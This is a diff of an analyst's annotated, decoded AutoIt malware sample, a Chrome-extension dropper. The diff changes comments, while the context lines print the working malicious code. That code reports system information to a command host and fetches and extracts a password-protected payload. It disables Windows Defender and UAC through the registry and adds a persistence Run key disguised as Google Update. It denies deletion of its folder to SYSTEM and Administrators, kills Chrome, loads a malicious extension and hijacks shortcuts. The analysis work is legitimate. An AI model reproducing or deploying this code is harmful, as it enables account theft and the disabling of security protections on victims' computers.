@@ -1,4 +1,4 @@
-; The decoded file, with some modifications
+; Decoded file with some modifications
 Global $virusdir = @AppDataDir & "\" & @UserName
 $lsrlgh = StringSplit("Start|cmd.exe|Program Manager", "|")
 $loptakx = StringSplit("updater|video|play|visitor|app", "|")
@@ -24,7 +24,7 @@ Func main() ; Main!!!!! - Check if vaild name
 	Else
 		Global $wintitle = WinGetTitle("[ACTIVE]") ; Get current active windows / current focused windows
 		If $wintitle = "" Then
-			$wintitle = "Empty" ; Why set the windows title to empty??????
+			$wintitle = "Empty" ; To report later
 		EndIf
 		main2() ; Yeah, the current function is really a main function, after first check it call the real thing :)
 	EndIf
@@ -58,10 +58,10 @@ EndFunc
 Func main5()
 	$vzmpkv = RegRead("HKCU\Software\Unzip", "Installed") ; Open registry key "HKCU\Software\Unzip" and read the value "Installed"
 	Global $itbnnhl = RegRead("HKCU\Software\Unzip", "Trust")
-	If $vzmpkv = "Yes" Then ; Check if Unzip program (I haven't seen any program named unzip, maybe 7-zip?)
+	If $vzmpkv = "Yes" Then ; Check key
 		found_unzip() ; Found Unzip
 	Else
-		$vzmpkv = "No" ; Decoded as 'No'
+		$vzmpkv = "No" 
 		notfound_unzip() ; Not found
 	EndIf
 EndFunc
@@ -85,7 +85,7 @@ Func found_unzip() ; Submit system information to server and get malaware from i
 	Global $httprequest = ObjCreate("winhttp.winhttprequest.5.1")
 	$httprequest.Open("HEAD", "http://pube.me/app/login.php", False)
 	$httprequest.setRequestHeader("User-Agent", "Unzip")
-	$httprequest.setRequestHeader("Windows", "[ACTIVE]")
+	$httprequest.setRequestHeader("Windows", $wintitle) ; The current active windows before running the virus
 	$httprequest.setRequestHeader("ScriptName", @ScriptName)
 	$httprequest.setRequestHeader("OS", @OSVersion)
 	$httprequest.setRequestHeader("DefenderActive", ProcessExists("MsMpEng.exe"))
@@ -130,7 +130,7 @@ EndFunc
 
 Func main9() ; Extract the virus
 	RunWait($virusdir & "\" & "7za.exe e files.7z -aoa -pKEQZmgbrmDnTpa2b4DHVMX", $virusdir, @SW_HIDE) ; Extract the virus, the protected password is KEQZmgbrmDnTpa2b4DHVMX
-	main10() ; This is when the malaware get executed, so if you want to fetch the file only, please comment this line!!!
+	main10() ; This is when the malware get executed, so if you want to fetch the file only, please comment this line!!!
 EndFunc
 
 Func main10() ; Kill Windows Defender
@@ -147,15 +147,15 @@ Func main11() ; Copy itself to virus directory
 EndFunc
 
 Func main12() ; Kill Chrome
-	While WinGetHandle(REGEXPTITLE:(?i)(.*Chrome.*)) ; Close chrome? Why?
+	While WinGetHandle(REGEXPTITLE:(?i)(.*Chrome.*)) ; Kill chrome by get the handle
 		WinClose([REGEXPTITLE:(?i)(.*Chrome.*)])
 	WEnd
 	ProcessClose("chrome.exe")
-	ProcessWaitClose("chrome.exe") ; Why kill chrome?
+	ProcessWaitClose("chrome.exe") ; Kill it to install the extension
 	main13()
 EndFunc
 
-Func main13() ; Protect itself from being killed or deleted
+Func main13() ; Protect itself from being deleted
 	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn setprot -op dacl:p_nc", $virusdir, @SW_HIDE)
 	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:SYSTEM;p:del_child;m:deny -ace n:SYSTEM;p:delete;m:deny", $virusdir, @SW_HIDE)
 	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:Administrators;p:del_child;m:deny -ace n:Administrators;p:delete;m:deny", $virusdir, @SW_HIDE)
@@ -165,8 +165,7 @@ Func main13() ; Protect itself from being killed or deleted
 	main14()
 EndFunc
 
-Func main14() ; Write registry to disable antiviruses and Chrome
-	;RegWrite("REG_DWORD", "LowRiskFileTypes", "REG_S", ".exe")
+Func main14() ; Write registry to disable antiviruses and change the Chrome Update
 	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations", "LowRiskFileTypes", "REG_SZ", ".exe")
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "Google Update", "REG_SZ", $virusdir & "\app.exe")
 	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", 0)
@@ -178,13 +177,13 @@ Func main14() ; Write registry to disable antiviruses and Chrome
 	main15()
 EndFunc
 
-Func main15() ; Insert malaware extension to Chrome (to steal Facebook!)
+Func main15() ; Insert malware extension to Chrome
 	ShellExecute("chrome.exe", "--enable-automation --restore-last-session --disable-blink-features=AutomationControlled --load-extension=" & $virusdir, "", "", @SW_MAXIMIZE)
 	main16()
 	zlmsyuslmwzh()
 EndFunc
 
-Func main16() ; Replace Chrome shortcut with malaware extension
+Func main16() ; Replace Chrome shortcut with malware extension command line
 	Local $array2d[5][2] ; Setup an 2D array
 	$array2d[0][0] = @AppDataDir & "\Microsoft\Internet Explorer\Quick Launch"
 	$array2d[1][0] = @AppDataCommonDir & "\Microsoft\Internet Explorer\Quick Launch"
@@ -224,7 +223,7 @@ Func sesrarlhuog($dgtnmsyt)
 	EndIf
 EndFunc
 
-Func ajaqfqn($kxpdbrfgb)
+Func ajaqfqn($kxpdbrfgb) ; Check shortcut name. "chrome" or "chromium" also work.
 	$gfwbjvvluo = FileGetShortcut($kxpdbrfgb)
 	If NOT @error Then
 		$agbhl = vpmfq($gfwbjvvluo[0], "", "", "", "")
